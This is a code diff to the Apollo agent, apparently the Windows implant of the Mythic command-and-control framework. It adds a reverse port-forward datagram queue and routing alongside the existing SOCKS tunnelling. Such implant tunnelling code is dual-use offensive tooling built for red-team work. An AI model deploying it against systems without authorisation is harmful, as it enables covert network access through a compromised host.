@@ -11,6 +11,7 @@ using System.Threading;
 using  System.Threading.Tasks;
 using System.Reflection;
 using ApolloInterop.Classes.Collections;
+using ApolloInterop.Utils;
 
 namespace Apollo.Management.Tasks
 {
@@ -23,6 +24,11 @@ namespace Apollo.Management.Tasks
         //private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();
 
         private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> SocksDatagramQueue = new()
+        {
+            { MessageDirection.ToMythic, new ConcurrentQueue<SocksDatagram>() },
+            { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
+        };
+        private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> RpfwdDatagramQueue = new()
         {
             { MessageDirection.ToMythic, new ConcurrentQueue<SocksDatagram>() },
             { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
@@ -187,6 +193,10 @@ namespace Apollo.Management.Tasks
         {
             SocksDatagramQueue[direction].Enqueue(dg);
         }
+        public void AddRpfwdDatagramToQueue(MessageDirection direction, SocksDatagram dg)
+        {
+            RpfwdDatagramQueue[direction].Enqueue(dg);
+        }
 
 
         public bool ProcessMessageResponse(MessageResponse resp)
@@ -198,6 +208,16 @@ namespace Apollo.Management.Tasks
                     foreach(SocksDatagram dg in resp.SocksDatagrams)
                     {
                         _agent.GetSocksManager().Route(dg);
+                    }
+                }).Start();
+            }
+            if (resp.RpfwdDatagrams != null)
+            {
+                new Thread(() =>
+                {
+                    foreach (SocksDatagram dg in resp.RpfwdDatagrams)
+                    {
+                        _agent.GetRpfwdManager().Route(dg);
                     }
                 }).Start();
             }
@@ -241,7 +261,7 @@ namespace Apollo.Management.Tasks
             //List<TaskResponse> responses = new List<TaskResponse>();
             //List<DelegateMessage> delegates = new List<DelegateMessage>();
             List<SocksDatagram> dgs = new List<SocksDatagram>();
-
+            List<SocksDatagram> rpfwdDgs = new List<SocksDatagram>();
             //while(TaskResponseQueue.TryDequeue(out TaskResponse res))
             //{
             //    responses.Add(res);
@@ -256,6 +276,11 @@ namespace Apollo.Management.Tasks
             {
                 dgs.Add(dg);
             }
+            while (RpfwdDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
+            {
+                DebugHelp.DebugWriteLine($"got rpfwd datagram to go to mythic: {dg.ServerID}");
+                rpfwdDgs.Add(dg);
+            }
 
             TaskingMessage msg = new TaskingMessage()
             {
@@ -263,7 +288,8 @@ namespace Apollo.Management.Tasks
                 TaskingSize = -1,
                 Delegates = DelegateMessages.Flush(),
                 Responses = TaskResponseList.Flush(),
-                Socks = dgs.ToArray()
+                Socks = dgs.ToArray(),
+                Rpfwd = rpfwdDgs.ToArray()
             };
             return onResponse(msg);
         }
